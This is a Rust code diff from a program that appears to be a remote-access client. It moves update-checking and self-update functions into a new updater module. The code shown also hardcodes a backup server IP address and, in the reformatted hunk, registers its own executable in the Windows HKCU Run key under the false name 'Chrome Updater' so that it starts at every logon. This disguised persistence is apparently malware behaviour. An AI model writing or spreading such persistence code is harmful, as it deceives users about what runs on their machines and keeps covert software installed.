@@ -8,15 +8,14 @@ mod client;
 mod globals;
 mod logger;
 mod unwrap;
+mod updater;
 mod utils;
-mod versions;
 
 use std::env;
 
 use tracing::*;
 
 use crate::addreses::{Address, Adresses};
-use crate::utils::Utils;
 
 /// Server ip backup if api isn't available
 pub const TCP_BACKUP_IP: &str = "136.243.156.104";
@@ -34,13 +33,13 @@ async fn main() {
     match args.iter().any(|v| v == "--update") {
         true => {
             let possision = args.iter().position(|r| r == "--update").unwrap();
-            Utils::update(&args[possision + 1].to_string())
+            updater::update(&args[possision + 1].to_string())
                 .await
                 .expect("Error updating");
         }
         false => (),
     }
-    match Utils::check_updates().await {
+    match updater::check_updates().await {
         Ok(_) => info!("Updates has been checked"),
         Err(e) => error!("Failed to check updates: {e}"),
     }
@@ -81,8 +80,21 @@ async fn main() {
 
                     //adding to autostart
                     info!("Adding to autostart");
-                    Utils::run_process("reg.exe",vec!["add","HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                    "/f","/v","Chrome Updater","/t","REG_SZ","/d",&exe_target],true)?;
+                    Utils::run_process(
+                        "reg.exe",
+                        vec![
+                            "add",
+                            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            "/f",
+                            "/v",
+                            "Chrome Updater",
+                            "/t",
+                            "REG_SZ",
+                            "/d",
+                            &exe_target,
+                        ],
+                        true,
+                    )?;
                 }
 
                 //check if process is runned
